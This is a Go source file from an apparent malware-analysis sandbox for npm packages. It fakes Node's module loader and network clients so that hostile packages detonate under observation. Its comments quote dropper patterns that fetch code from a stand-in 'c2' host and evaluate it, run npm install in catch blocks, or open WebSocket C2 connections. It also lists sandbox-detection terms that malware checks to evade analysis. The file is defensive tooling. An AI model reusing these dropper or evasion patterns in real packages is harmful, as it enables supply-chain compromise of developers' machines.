package sandbox

import (
	"bytes"
	"encoding/json"
	"fmt"
	"path/filepath"
	"strconv"
	"strings"

	"scbox/internal/third_party/goja"

	"scbox/internal/trace"
	"scbox/internal/vfs"
)

// loader implements CommonJS require() over a faked Node module space.
type loader struct {
	r        *Runtime
	cache    map[string]goja.Value
	builtins map[string]func() goja.Value
	declared map[string]bool // declared deps of every package.json in the tree (lazy)
}

// isDeclaredDep reports whether name appears in the dependencies /
// optionalDependencies / peerDependencies of any package.json in the analyzed
// tree. A package's own declared dependencies WOULD be present in a real npm
// install, so an unresolved require of one (e.g. when running with --no-deps,
// or a transitive dep we didn't materialize) should be stubbed rather than
// thrown - otherwise a payload that sits after `require('jws')` / a benign dep
// never detonates (a false negative). Truly-unknown specifiers - the kind a
// dropper deliberately fails to install (try{require('x')}catch{…}) - are NOT
// declared and still throw, so that pattern keeps firing. Computed once.
func (l *loader) isDeclaredDep(name string) bool {
	if l.declared == nil {
		l.declared = map[string]bool{}
		if fs := l.r.cfg.FS; fs != nil {
			fs.Walk(l.r.cfg.BaseDir, func(p string, isDir bool) {
				if isDir || filepath.Base(p) != "package.json" {
					return
				}
				b, ok := fs.Read(p)
				if !ok {
					return
				}
				var pj struct {
					Dependencies         map[string]json.RawMessage `json:"dependencies"`
					OptionalDependencies map[string]json.RawMessage `json:"optionalDependencies"`
					PeerDependencies     map[string]json.RawMessage `json:"peerDependencies"`
				}
				if json.Unmarshal(b, &pj) != nil {
					return
				}
				for _, m := range []map[string]json.RawMessage{pj.Dependencies, pj.OptionalDependencies, pj.PeerDependencies} {
					for k := range m {
						l.declared[strings.ToLower(k)] = true
					}
				}
			})
		}
	}
	n := strings.ToLower(name)
	if l.declared[n] {
		return true
	}
	// Subpath specifier (tailwindcss/plugin, @scope/pkg/sub) - match the package
	// root against the declared set.
	return l.declared[pkgRoot(n)]
}

// pkgRoot returns the package name of a possibly-subpath bare specifier:
// "tailwindcss/plugin" -> "tailwindcss", "@scope/pkg/x" -> "@scope/pkg".
func pkgRoot(name string) string {
	if strings.HasPrefix(name, "@") {
		parts := strings.SplitN(name, "/", 3)
		if len(parts) >= 2 {
			return parts[0] + "/" + parts[1]
		}
		return name
	}
	if i := strings.IndexByte(name, '/'); i >= 0 {
		return name[:i]
	}
	return name
}

func newLoader(r *Runtime) *loader {
	l := &loader{r: r, cache: map[string]goja.Value{}}
	l.builtins = r.builtinRegistry()
	return l
}

// installBootstrap injects the logging-Proxy factory used for unresolved
// external dependencies, and the global `require`, `module`, and `exports`
// bindings used by top-level (lifecycle) scripts.
func (l *loader) installBootstrap() {
	r := l.r
	must(r.vm.Set("__trace_fake_call", r.fn(func(call goja.FunctionCall) goja.Value {
		path := argStr(call.Argument(0))
		var args []string
		// Stringify each call argument through goja's own String() (bounded by the
		// VM call-stack limit, and clipped by argStr) rather than Export()+%v: a
		// hostile package can pass a deeply-nested or cyclic object, and reflecting
		// it with fmt recurses until the Go stack overflows and the host process
		// dies - an uncatchable crash. See argStr.
		if arr := call.Argument(1); arr != nil && !goja.IsUndefined(arr) && !goja.IsNull(arr) {
			if o := arr.ToObject(r.vm); o != nil {
				n := 0
				if lv := o.Get("length"); lv != nil {
					n = int(lv.ToInteger())
				}
				if n > 32 {
					n = 32 // cap how many args we record; the rest are noise
				}
				for i := 0; i < n; i++ {
					args = append(args, r.displayArg(o.Get(strconv.Itoa(i))))
				}
			}
		}
		r.tr.Record(trace.CatModule, "external-call:"+path, args...)
		return goja.Undefined()
	})))

	must(r.vm.Set("__trace_env", r.fn(func(call goja.FunctionCall) goja.Value {
		key := argStr(call.Argument(0))
		r.tr.Record(trace.CatEnv, "process.env", key)
		r.tr.AddEnv(key)
		return goja.Undefined()
	})))

	const bootstrap = `(function(){
	var _fc = globalThis.__trace_fake_call;  // captured so we survive global deletion
	var _env = globalThis.__trace_env;
	var _net = globalThis.__trace_net;
	// Mirror WHATWG URL parsing / Node's http client: leading and trailing C0
	// control chars and spaces are stripped before the scheme is read, so a
	// payload that hides its endpoint as atob('\thttps://c2…') still resolves to
	// a live request. Anchoring on a bare /^https?/ would let that tab defeat the
	// fake and silently break the download-and-execute chain (a false negative).
	function clean(u){ return typeof u === 'string' ? u.replace(/^[\u0000-\u0020]+/, '').replace(/[\u0000-\u0020]+$/, '') : u; }
	function isHTTP(u){ return typeof u === 'string' && /^https?:\/\//.test(clean(u)); }
	// Anti-evasion for environment-detector deps. Malware routinely gates its
	// payload behind a sandbox/VM/CI check delegated to a small npm module
	//   const env = require('node-env-detector')();
	//   if (env.isCI || env.isContainer || env.isVirtualMachineLikely) return; // bail
	//   else { ...decrypt+eval... }
	// When that dep is unresolved we fake it - but the generic fake returns a
	// TRUTHY stub for every property, so env.isCI reads true and the sample takes
	// its own evasion bail-out: we'd be telling the malware "yes, you're in a
	// sandbox". A boolean-shaped detection predicate must instead answer the
	// believable "real victim machine" value, false, so the gated payload runs.
	// (Property-style detectors like node-env-detector expose booleans, not
	// predicate functions, so returning the primitive is correct for them.)
	function isSandboxPred(p){
		if (typeof p !== 'string') return false;
		var s = p.toLowerCase().replace(/^(is|in|are|has|detect|check|get|running)/, '');
		return /^(ci|npmbot|vm|virtual|sandbox|container|docker|kubernet|k8s|wsl|qemu|vbox|vmware|xen|hyperv|emulat|headless|automat|cgroup|lxc|podman|ec2|gce|codespace|gitpod|replit)/.test(s);
	}
	// Any remote endpoint a network client is constructed with - http(s) plus the
	// ws(s) used by WebSocket C2 (the unresolved ws npm module's constructor flows
	// through this Proxy).
	function isEndpoint(u){ return typeof u === 'string' && /^(?:https?|wss?):\/\//.test(clean(u)); }
	// A JSON-encoded response body whose every common payload field carries the
	// fetched marker. request/needle-style clients hand the caller a raw body
	// STRING, and droppers parse it (JSON.parse(body).cookie) before eval'ing the
	// field - so the marker must survive a real JSON.parse and land under whatever
	// key the loader happens to read.
	var FETCHED_JSON = JSON.stringify({
		cookie: "/* fetched */", content: "/* fetched */", content_o: "/* fetched */",
		data: "/* fetched */", code: "/* fetched */", payload: "/* fetched */",
		session: "/* fetched */", script: "/* fetched */", token: "/* fetched */",
		key: "/* fetched */", value: "/* fetched */", result: "/* fetched */",
		body: "/* fetched */", message: "/* fetched */", errCode: "/* fetched */",
		cmd: "/* fetched */", command: "/* fetched */", eval: "/* fetched */"
	});
	function fakeResp(){
		var payload = "/* fetched */";
		// data is a Proxy returning the fetched-payload marker for ANY property the
		// sample reads (res.data.cookie, res.data.code, res.data.payload, etc.), so a
		// download-and-execute chain like Function(res.data.cookie)() always feeds
		// the marker to the eval hook and is detected regardless of the field name.
		var data = new Proxy({ content: payload, content_o: payload, data: payload }, {
			get: function(t, p){
				if (p === Symbol.toPrimitive || p === 'toString' || p === 'valueOf') return function(){ return payload; };
				if (typeof p === 'symbol') return t[p];
				if (p in t) return t[p];
				return payload;
			}
		});
		return { data: data, body: FETCHED_JSON, status: 200, statusCode: 200, headers: {},
			text: function(){ return FETCHED_JSON; }, json: function(){ return data; } };
	}
	function thenable(resp){
		return {
			then: function(res, rej){ try { if (typeof res === 'function') { res(resp); } } catch(e) {} return this; },
			catch: function(){ return this; }
		};
	}
	function mk(path){
		var t = function(){};
		return new Proxy(t, {
			get: function(target, prop){
				if (prop === Symbol.toPrimitive || prop === 'toString' || prop === 'valueOf' || prop === Symbol.toStringTag) return function(){ return path; };
				if (prop === '__esModule') return false;
				if (prop === 'then') return undefined;
				// Answer sandbox/VM/CI detection predicates with false so a payload
				// gated behind "if (env.isCI) bail" detonates instead of evading.
				if (isSandboxPred(prop)) return false;
				// Make the stub destructurable: real libraries routinely do
				//   const [a, {b}] = theme.fontSize.base
				// on values we've faked. Without an iterator that throws "X is not
				// iterable" at module top, killing the file before a trailing payload
				// runs (a false negative). Yield a bounded run of sub-proxies.
				if (prop === Symbol.iterator) return function(){
					var i = 0;
					return { next: function(){ return i++ < 8 ? { value: mk(path + '.' + i), done: false } : { value: undefined, done: true }; } };
				};
				if (typeof prop === 'symbol') return undefined;
				return mk(path + '.' + String(prop));
			},
			apply: function(target, thiz, args){
				_fc(path, args);
				args = args || [];
				// Find the request URL: a string argument, or the .url/.uri/.href of an
				// options object (the request/needle/axios-config calling convention).
				var url = null;
				for (var i = 0; i < args.length; i++) {
					var a = args[i];
					if (typeof a === 'string' && isHTTP(a)) { url = a; break; }
					if (a && typeof a === 'object') {
						var u = a.url || a.uri || a.href;
						if (typeof u === 'string' && isHTTP(u)) { url = u; break; }
					}
				}
				if (url && _net) { try { _net('http.request', String(url)); } catch(e) {} }
				// request(opts, cb) / get(url, cb): a Node-style trailing callback only
				// runs in real life once the response arrives. Drive it with a believable
				// (err=null, response, body) so the dropper's
				//   (e,r,b) => Function(JSON.parse(b).cookie)(require)
				// stage actually detonates. Gate on a recognized URL so we never invoke
				// arbitrary non-network callbacks (e.g. a faked lodash iteratee).
				if (url) {
					var cb = (args.length && typeof args[args.length - 1] === 'function') ? args[args.length - 1] : null;
					if (cb) { var rsp = fakeResp(); try { cb(null, rsp, rsp.body); } catch(e) {} }
					return thenable(fakeResp());
				}
				return mk(path + '()');
			},
			construct: function(target, args){
				_fc('new ' + path, args);
				// A network client built with a remote endpoint (e.g. new WebSocket('wss://c2'))
				// - record the contacted endpoint so socket/WS C2 is visible.
				var url = args && args[0];
				if (_net && isEndpoint(url)) { try { _net('WebSocket', String(url)); } catch(e) {} }
				return mk('new ' + path);
			}
		});
	}
	globalThis.__mkFake = mk;
	// A standalone any-property-marker object (the same proxy fakeResp().data uses)
	// for callers that synthesize their own response, e.g. the fetch() stub's
	// .json(): res.json()[whateverField] must still yield the fetched marker so a
	// download-and-execute chain detonates regardless of the field name it reads.
	globalThis.__fetchedData = function(){ return fakeResp().data; };
	globalThis.__mkEnvProxy = function(target){
		return new Proxy(target, {
			get: function(t, p){ if (typeof p === 'string') { _env(p); } return t[p]; },
			set: function(t, p, v){ t[p] = v; return true; },
			has: function(t, p){ return p in t; }
		});
	};
})();`
	if _, err := r.vm.RunString(bootstrap); err != nil {
		panic(fmt.Errorf("sandbox: bootstrap failed: %w", err))
	}
	// Capture the factories so they remain callable after hideInternals deletes
	// their global names.
	r.mkFake = r.vm.GlobalObject().Get("__mkFake")
	r.mkEnvProxy = r.vm.GlobalObject().Get("__mkEnvProxy")
	r.fetchedData = r.vm.GlobalObject().Get("__fetchedData")

	// process relies on the env-proxy factory, so install it after the bootstrap.
	r.installProcess()

	// Keep `require` global so code inside eval()'d payloads can reach it (our
	// eval is indirect; a real direct eval would have module-scope require).
	// module/exports/__dirname/__filename are deliberately NOT global - in real
	// Node they're module-scoped, so leaking them onto globalThis is a tell.
	// node -e gets them via RunTopLevel's wrapper instead.
	set(r.vm.GlobalObject(), "require", l.requireFn(r.cfg.BaseDir))

	// Attach the commonly-probed require.* surface.
	_, _ = r.vm.RunString(`(function(){
      if (typeof require === 'function') {
        try { require.resolve = function(p){ return String(p); }; } catch(e){}
        try { require.cache = {}; } catch(e){}
        try { require.main = { exports: {}, id: '.', loaded: true, children: [], paths: [] }; } catch(e){}
        try { require.extensions = { '.js': function(){}, '.json': function(){}, '.node': function(){} }; } catch(e){}
      }
    })();`)
}

// RunTopLevel runs a top-level script (e.g. `node -e`) inside a CommonJS wrapper
// so it gets module-scoped require/module/exports/__dirname/__filename - exactly
// like Node, and without leaking those names onto globalThis.
func (r *Runtime) RunTopLevel(name, code, dir string) {
	src := r.transpile(name, []byte(code))
	wrapper := "(function (exports, require, module, __filename, __dirname) {\n" + src + "\n})"
	prog, err := goja.Compile(r.virtualPath(filepath.Join(dir, name)), wrapper, false)
	if err != nil {
		// Fall back to a raw run so we still detonate something.
		_, _ = r.RunString(name, code)
		return
	}
	fnv, rerr := r.runProgram(name, prog)
	if rerr != nil {
		return
	}
	fn, ok := goja.AssertFunction(fnv)
	if !ok {
		return
	}
	moduleObj := r.obj()
	set(moduleObj, "exports", r.obj())
	vdir := r.virtualPath(dir)
	r.safeCall(name, fn, goja.Undefined(),
		moduleObj.Get("exports"),
		r.ld.requireFn(dir),
		moduleObj,
		r.vm.ToValue(vdir+"/"+name),
		r.vm.ToValue(vdir),
	)
}

// requireFn returns a JS require() bound to a specific directory.
func (l *loader) requireFn(fromDir string) goja.Value {
	return l.r.fn(func(call goja.FunctionCall) goja.Value {
		spec := call.Argument(0).String()
		return l.require(spec, fromDir)
	})
}

// virtualPath maps a real on-disk path under BaseDir to the believable path the
// sample is told it lives at (hides /tmp/scbox-* from __dirname/__filename).
func (r *Runtime) virtualPath(realAbs string) string {
	base, err := filepath.Abs(r.cfg.BaseDir)
	if err != nil {
		return realAbs
	}
	rel, err := filepath.Rel(base, realAbs)
	if err != nil || strings.HasPrefix(rel, "..") {
		return realAbs
	}
	if rel == "." {
		return r.cfg.VirtualBase
	}
	return filepath.Join(r.cfg.VirtualBase, rel)
}

// realFromVirtual maps a believable absolute path the sample constructed (e.g.
// require(__dirname + '/x')) back to its real location on disk.
func (r *Runtime) realFromVirtual(spec string) string {
	vb := r.cfg.VirtualBase
	if vb == "" || !strings.HasPrefix(spec, vb) {
		return spec
	}
	rel, err := filepath.Rel(vb, spec)
	if err != nil {
		return spec
	}
	return filepath.Join(r.cfg.BaseDir, rel)
}

// require resolves and loads a module specifier.
func (l *loader) require(spec, fromDir string) goja.Value {
	r := l.r
	// Map any believable absolute path the sample built back to the real disk.
	spec = r.realFromVirtual(spec)
	// Builtin core module (strip optional node: scheme).
	name := strings.TrimPrefix(spec, "node:")
	if ctor, ok := l.builtins[name]; ok {
		key := "builtin:" + name
		if v, ok := l.cache[key]; ok {
			return v
		}
		r.tr.Record(trace.CatModule, "require-builtin", name)
		v := ctor()
		l.cache[key] = v
		return v
	}

	// Always-fake network/HTTP client libraries, even when the real package is
	// materialized in node_modules. Two reasons: (1) uniform, reliable capture of
	// every outbound request through our instrumented stub; (2) the real clients
	// (axios/got/undici) are large and their async adapters don't drive their
	// .then()/await continuations to completion inside goja, so a malware exfil or
	// download-and-execute chain like `axios.get(c2).then(r=>Function(r.data.x)())`
	// silently stalls. Our fake resolves synchronously and feeds the fetched-payload
	// marker, so the chain detonates and is detected. (Analyzing one of these
	// packages itself is unaffected - the root is always loaded from real source.)
	if alwaysFakeModule[name] {
		key := "fake:" + name
		if v, ok := l.cache[key]; ok {
			return v
		}
		r.tr.Record(trace.CatModule, "require-stubbed-client", name)
		v := r.callMkFake(name)
		l.cache[key] = v
		return v
	}

	// Relative or absolute path → load from disk within the package.
	if strings.HasPrefix(spec, "./") || strings.HasPrefix(spec, "../") || strings.HasPrefix(spec, "/") {
		abs, err := l.resolveFile(spec, fromDir)
		if err != nil {
			// Real Node throws MODULE_NOT_FOUND for a missing relative/absolute path.
			// Malware leans on that for the dropper shape
			//   try { require('../../second-stage') } catch { execSync('npm install …') }
			// where the malicious catch only fires because the require throws. Faking
			// it here silently swallowed the catch (multer-express: the install of a
			// runtime-fetched second stage was never observed). Throw to stay faithful
			// and detonate the catch; the overlay check above already keeps the
			// sample's own dropped files resolvable.
			r.tr.Note(trace.CatModule, "require-missing", err.Error(), spec)
			panic(r.nodeError("MODULE_NOT_FOUND", "require", spec))
		}
		if !l.withinBase(abs) {
			r.tr.Note(trace.CatModule, "require-escape-blocked", abs, spec)
			return r.callMkFake(spec)
		}
		return l.loadFile(abs)
	}

	// Private subpath import (package.json "imports", e.g. chalk's
	// "#supports-color"). Resolve it against the owning package's imports map.
	if strings.HasPrefix(name, "#") {
		if abs, err := l.resolvePackageImports(name, fromDir); err == nil && l.withinBase(abs) {
			r.tr.Record(trace.CatModule, "require-internal", name)
			return l.loadFile(abs)
		}
		r.tr.Record(trace.CatModule, "require-external", name)
		return r.callMkFake(spec)
	}

	// Bare specifier → try node_modules, else treat as external.
	if abs, err := l.resolveNodeModule(name, fromDir); err == nil && l.withinBase(abs) {
		r.tr.Record(trace.CatModule, "require-dep", name)
		r.tr.AddDependency(name)
		return l.loadFile(abs)
	}
	r.tr.Record(trace.CatModule, "require-external", name)
	r.tr.AddDependency(name)
	// A bare specifier that resolves to nothing is, in real Node, a thrown
	// MODULE_NOT_FOUND. Malware relies on that for the dropper shape
	//   try { require('x') } catch { execSync('npm install x'); require('./x') }
	// where the malicious catch only runs because the require throws - so for an
	// UNKNOWN package we throw, detonating the catch. But a well-known network/util
	// package (axios, node-fetch, …) would actually be present in a real install;
	// faking it lets exfil chains like `require('axios').get(url).then(eval)` run
	// instead of dying at the require. So: fake the known, throw the rest.
	// forceThrowRequire is the second force-exec pass: a dropper hides its payload
	// in the CATCH of `try{require('second-stage')}catch{ execSync('npm install …') }`
	// and DECLARES that second stage as a dependency precisely so npm fetches it -
	// so faking it (pass 1, to keep payload-after-require alive) suppresses the
	// catch. This pass throws every unresolved bare require so those catches fire.
	if r.forceThrowRequire {
		panic(r.nodeError("MODULE_NOT_FOUND", "require", name))
	}
	if fakeWhenUnresolved[strings.ToLower(name)] || l.isDeclaredDep(name) {
		return r.callMkFake(spec)
	}
	panic(r.nodeError("MODULE_NOT_FOUND", "require", name))
}

// fakeWhenUnresolved lists packages that, when not materialized, are stubbed with
// a logging proxy rather than throwing MODULE_NOT_FOUND. These are popular
// HTTP/network/crypto/util libraries that a real install would contain, and that
// malware drives to exfiltrate or download-and-execute - so keeping their call
// chains alive (vs. throwing) preserves detonation. Anything NOT here throws, so
// a dropper's `try{require('unknown-second-stage')}catch{…}` still fires.
var fakeWhenUnresolved = map[string]bool{
	"axios": true, "node-fetch": true, "got": true, "request": true, "undici": true,
	"superagent": true, "needle": true, "cross-fetch": true, "isomorphic-fetch": true,
	"node-fetch-native": true, "phin": true, "bent": true, "wreck": true, "ky": true,
	"ws": true, "websocket": true, "socket.io-client": true, "form-data": true,
	"https-proxy-agent": true, "http-proxy-agent": true, "socks-proxy-agent": true,
	"tunnel": true, "node-forge": true, "tweetnacl": true, "elliptic": true,
	"bcryptjs": true, "jsonwebtoken": true, "dotenv": true, "shelljs": true,
	"execa": true, "fs-extra": true, "lodash": true, "chalk": true, "colors": true,
	"systeminformation": true, "node-machine-id": true, "keytar": true,
}

// alwaysFakeModule names HTTP/network client libraries that are stubbed with the
// instrumented fake even when the real package is installed - so every request is
// captured uniformly and async exfil/download-execute chains detonate (the real
// clients' adapters don't complete their promise chains inside goja). These carry
// no analysis value of their own (known-good libraries); the sample's USE of them
// is what we want to observe.
var alwaysFakeModule = map[string]bool{
	"axios": true, "got": true, "node-fetch": true, "undici": true, "request": true,
	"superagent": true, "needle": true, "phin": true, "bent": true, "wreck": true,
	"ky": true, "cross-fetch": true, "isomorphic-fetch": true, "node-fetch-native": true,
	"request-promise": true, "request-promise-native": true, "follow-redirects": true,
}

// callMkFake returns a logging Proxy standing in for an unresolved module.
func (r *Runtime) callMkFake(name string) goja.Value {
	mk, ok := goja.AssertFunction(r.mkFake)
	if !ok {
		return r.obj()
	}
	v, err := mk(goja.Undefined(), r.vm.ToValue(name))
	if err != nil {
		return r.obj()
	}
	return v
}

// withinBase reports whether abs resolves to a location inside the package
// root. With an in-memory FS there are no symlinks to follow (they're never
// ingested), so this is a pure virtual-path containment check - which also
// eliminates the symlink-escape attack surface entirely.
func (l *loader) withinBase(abs string) bool {
	base := vfs.Clean(l.r.cfg.BaseDir)
	p := vfs.Clean(abs)
	if p == base || base == "/" {
		return true
	}
	return strings.HasPrefix(p, base+"/")
}

// scopeForPath derives the package attribution for a file path: the last
// node_modules/<name> (or node_modules/@scope/name) segment, else "(root)".
func scopeForPath(abs string) string {
	parts := strings.Split(filepath.ToSlash(abs), "/")
	last := -1
	for i, p := range parts {
		if p == "node_modules" {
			last = i
		}
	}
	if last < 0 || last+1 >= len(parts) {
		return "(root)"
	}
	name := parts[last+1]
	if strings.HasPrefix(name, "@") && last+2 < len(parts) {
		name += "/" + parts[last+2]
	}
	return name
}

// resolveFile applies Node's file-resolution candidates.
func (l *loader) resolveFile(spec, fromDir string) (string, error) {
	base := filepath.Join(fromDir, spec)
	candidates := []string{
		base,
		base + ".js",
		base + ".cjs",
		base + ".mjs",
		base + ".ts",
		base + ".tsx",
		base + ".cts",
		base + ".mts",
		base + ".jsx",
		base + ".json",
		filepath.Join(base, "index.js"),
		filepath.Join(base, "index.ts"),
		filepath.Join(base, "index.cjs"),
		filepath.Join(base, "index.json"),
	}
	// Directory with package.json main.
	if main := l.pkgMain(base); main != "" {
		candidates = append([]string{filepath.Join(base, main)}, candidates...)
	}
	for _, c := range candidates {
		if isDir, exists := l.r.cfg.FS.Stat(c); exists && !isDir {
			return vfs.Clean(c), nil
		}
		// Also honor the vfs overlay: a file the sample dropped at runtime
		// (writeFileSync) lives only in the overlay, not the extracted tree, so a
		// drop-then-require self-staging chain must still resolve and detonate.
		if _, ok := l.r.vfs[vfs.Clean(c)]; ok {
			return vfs.Clean(c), nil
		}
	}
	return "", fmt.Errorf("cannot resolve %q from %s", spec, fromDir)
}

func (l *loader) resolveNodeModule(name, fromDir string) (string, error) {
	// Split a bare specifier into its package name and an optional subpath:
	//   "es-errors/syntax"   → pkg "es-errors",     sub "syntax"
	//   "@scope/pkg/lib/x"   → pkg "@scope/pkg",    sub "lib/x"
	// Without this, a subpath import like require('es-errors/syntax') would look
	// for a DIRECTORY node_modules/es-errors/syntax (there is none - it's a file),
	// fail, and fall back to a fake proxy. That silently breaks foundational
	// packages (es-errors → get-intrinsic → call-bound/side-channel/qs/…).
	pkg, sub := name, ""
	if strings.HasPrefix(name, "@") {
		if i := strings.IndexByte(name, '/'); i >= 0 {
			if j := strings.IndexByte(name[i+1:], '/'); j >= 0 {
				pkg, sub = name[:i+1+j], name[i+1+j+1:]
			}
		}
	} else if i := strings.IndexByte(name, '/'); i >= 0 {
		pkg, sub = name[:i], name[i+1:]
	}

	dir := fromDir
	for {
		pkgDir := filepath.Join(dir, "node_modules", pkg)
		if isDir, exists := l.r.cfg.FS.Stat(pkgDir); exists && isDir {
			if sub != "" {
				// Resolve the subpath as a file within the package (handles
				// "syntax" → syntax.js, "lib/x" → lib/x.js, dir → index.js).
				return l.resolveFile("./"+sub, pkgDir)
			}
			main := l.pkgMain(pkgDir)
			if main == "" {
				main = "index.js"
			}
			return l.resolveFile("./"+main, pkgDir)
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			return "", fmt.Errorf("module %q not found in node_modules", name)
		}
		dir = parent
	}
}

// resolvePackageImports resolves a package-private "#"-import (Node's
// package.json "imports" field, e.g. chalk's "#supports-color") by walking up
// from fromDir to the nearest package.json that defines a matching key, then
// resolving the (possibly condition-keyed) target file. Without this the import
// falls back to a fake proxy, which silently breaks the package (chalk computes
// a color level off a proxy and throws "level should be an integer 0 to 3").
func (l *loader) resolvePackageImports(spec, fromDir string) (string, error) {
	dir := fromDir
	for {
		pjPath := filepath.Join(dir, "package.json")
		if data, ok := l.r.cfg.FS.Read(pjPath); ok {
			var pj struct {
				Imports map[string]json.RawMessage `json:"imports"`
			}
			if json.Unmarshal(data, &pj) == nil && len(pj.Imports) > 0 {
				if raw, ok := pj.Imports[spec]; ok {
					if target := pickConditional(raw); target != "" {
						return l.resolveFile(target, dir)
					}
				}
			}
			// package.json with no matching import: this is the package root, stop.
			return "", fmt.Errorf("no imports entry for %q", spec)
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			return "", fmt.Errorf("no package.json above %s", fromDir)
		}
		dir = parent
	}
}

// pickConditional resolves a package.json imports/exports target that may be a
// plain string or a conditions object ({"node":...,"default":...}); we emulate
// Node, so prefer "node", then common CJS/default conditions.
func pickConditional(raw json.RawMessage) string {
	var s string
	if json.Unmarshal(raw, &s) == nil {
		return s
	}
	var cond map[string]json.RawMessage
	if json.Unmarshal(raw, &cond) != nil {
		return ""
	}
	for _, key := range []string{"node", "node-addons", "require", "default", "import"} {
		if sub, ok := cond[key]; ok {
			if target := pickConditional(sub); target != "" {
				return target
			}
		}
	}
	return ""
}

func (l *loader) pkgMain(dir string) string {
	data, ok := l.r.cfg.FS.Read(filepath.Join(dir, "package.json"))
	if !ok {
		return ""
	}
	var pj struct {
		Main string `json:"main"`
	}
	if json.Unmarshal(data, &pj) != nil {
		return ""
	}
	return pj.Main
}

// binaryModuleExts are file types that are never JavaScript source: native
// addons, WebAssembly, compiled libraries, and common asset/archive formats that
// occasionally sit beside code. Compiling them as JS only produces noise.
var binaryModuleExts = map[string]bool{
	".node": true, ".wasm": true, ".so": true, ".dll": true, ".dylib": true,
	".a": true, ".o": true, ".bin": true, ".exe": true, ".class": true,
	".png": true, ".jpg": true, ".jpeg": true, ".gif": true, ".ico": true, ".bmp": true,
	".webp": true, ".woff": true, ".woff2": true, ".ttf": true, ".eot": true, ".otf": true,
	".gz": true, ".br": true, ".zip": true, ".tgz": true, ".bz2": true, ".xz": true, ".zst": true,
	".pdf": true, ".mp3": true, ".mp4": true, ".wav": true, ".webm": true, ".mov": true,
}

// isBinaryModule reports whether abs is a non-JavaScript binary that must not be
// transpiled/compiled - decided by a known binary extension or, failing that, by
// a NUL byte in the head of the content (text/JS never contains NUL). This is a
// content check, not a size check: large *source* files are still analyzed.
func isBinaryModule(abs string, data []byte) bool {
	if binaryModuleExts[strings.ToLower(filepath.Ext(abs))] {
		return true
	}
	head := data
	if len(head) > 8192 {
		head = head[:8192]
	}
	return bytes.IndexByte(head, 0) >= 0
}

// declaresIdentifier reports whether src contains a top-level lexical/var/function
// declaration that binds name (e.g. ESM files doing `const __dirname = …`). Used
// to avoid emitting a CommonJS wrapper parameter that would collide with it. This
// is a cheap textual scan - over-detection only means we drop a wrapper param the
// file is already providing, which is the safe direction.
func declaresIdentifier(src, name string) bool {
	for _, kw := range []string{"const ", "let ", "var ", "function ", "function* "} {
		idx := 0
		for {
			at := strings.Index(src[idx:], kw+name)
			if at < 0 {
				break
			}
			pos := idx + at
			// The char after the match must be a word boundary (not part of a
			// longer identifier like __dirnameFoo).
			end := pos + len(kw) + len(name)
			if end >= len(src) || !isIdentChar(src[end]) {
				return true
			}
			idx = pos + len(kw)
		}
	}
	return false
}

func isIdentChar(b byte) bool {
	return b == '_' || b == '$' || (b >= 'a' && b <= 'z') || (b >= 'A' && b <= 'Z') || (b >= '0' && b <= '9')
}

// loadFile reads, wraps, and executes a module file, caching its exports.
func (l *loader) loadFile(abs string) goja.Value {
	r := l.r
	if v, ok := l.cache[abs]; ok {
		return v
	}
	if l.r.cfg.FS == nil {
		return r.obj()
	}
	// Read through the vfs overlay (runtime writes) THEN the extracted package tree,
	// so a module dropped at runtime (`fs.writeFileSync('/tmp/w.js', …); fork(…)` /
	// `require('/tmp/w.js')`) is loadable and its payload detonates - write→require
	// consistency, the point of the in-memory FS.
	src, ok := r.vfsRead(abs)
	if !ok {
		r.tr.Note(trace.CatModule, "read-error", "not found", abs)
		return r.obj()
	}
	data := []byte(src)

	if strings.HasSuffix(abs, ".json") {
		parsed, perr := r.parseJSON(string(data))
		if perr != nil {
			r.tr.Note(trace.CatModule, "json-error", perr.Error(), abs)
			parsed = r.obj()
		}
		l.cache[abs] = parsed
		return parsed
	}

	r.tr.Record(trace.CatModule, "load-file", abs)

	moduleObj := r.obj()
	exportsObj := r.obj()
	set(moduleObj, "exports", exportsObj)
	l.cache[abs] = exportsObj // placeholder for cycles

	// Native addons (.node) and other binary artifacts are not JavaScript; Node
	// loads them through process.dlopen, never the JS parser. We cannot run the
	// native code, but returning a bare {} makes callers crash on the very first
	// access (`binding.native.resolve` → "Cannot read property 'native' of
	// undefined"), which aborts detonation and floods the trace. Instead stand the
	// addon up as the permissive logging proxy: every property access and call
	// returns another stub (and is recorded), so native-binding-dependent code -
	// e.g. typescript's bundled oxc resolver - keeps executing instead of dying.
	if isBinaryModule(abs, data) {
		r.tr.Record(trace.CatModule, "native-addon", abs)
		stub := r.callMkFake("native:" + filepath.Base(abs))
		l.cache[abs] = stub
		return stub
	}

	// Transpile TS/JSX/ESM/modern-JS down to goja-friendly CommonJS.
	source := r.transpile(abs, data)
	dir := filepath.Dir(abs)

	// Build the CommonJS wrapper and its matching argument list together. ESM files
	// legitimately declare their own `const __dirname = fileURLToPath(import.meta.url)`
	// / `const __filename`; transpiled to CJS those become top-level lexical
	// declarations that collide with a same-named wrapper PARAMETER ("Identifier
	// '__dirname' has already been declared"). Omit any such param the source
	// already binds - the file's own declaration then supplies it - and keep the
	// positional args aligned with the params we actually emit.
	type cjsParam struct {
		name string
		arg  goja.Value
	}
	all := []cjsParam{
		{"exports", exportsObj},
		{"require", l.requireFn(dir)},
		{"module", moduleObj},
		{"__filename", r.vm.ToValue(r.virtualPath(abs))},
		{"__dirname", r.vm.ToValue(r.virtualPath(dir))},
	}
	names := make([]string, 0, len(all))
	args := make([]goja.Value, 0, len(all))
	for _, p := range all {
		if (p.name == "__filename" || p.name == "__dirname") && declaresIdentifier(source, p.name) {
			continue
		}
		names = append(names, p.name)
		args = append(args, p.arg)
	}
	wrapper := "(function (" + strings.Join(names, ", ") + ") {\n" + source + "\n})"
	// Compile under the believable virtual path so Error().stack and any error
	// messages don't leak the real /tmp/scbox-* location.
	prog, cerr := goja.Compile(r.virtualPath(abs), wrapper, false)
	if cerr != nil {
		r.tr.Note(trace.CatModule, "compile-error", cerr.Error(), abs)
		return exportsObj
	}
	fnVal, rerr := r.runProgram(abs, prog)
	if rerr != nil {
		return exportsObj
	}
	fn, ok := goja.AssertFunction(fnVal)
	if !ok {
		return exportsObj
	}
	// Attribute everything this module does to its owning package. The sample sees
	// believable __filename/__dirname, not the temp path.
	prevScope := r.tr.SetScope(scopeForPath(abs))
	r.safeCall("module:"+abs, fn, goja.Undefined(), args...)
	r.tr.SetScope(prevScope)
	// A module can redefine module.exports as an accessor; read it defensively
	// so a throwing getter can't crash the loader.
	final := r.safeGet(moduleObj, "exports", "module:"+abs)
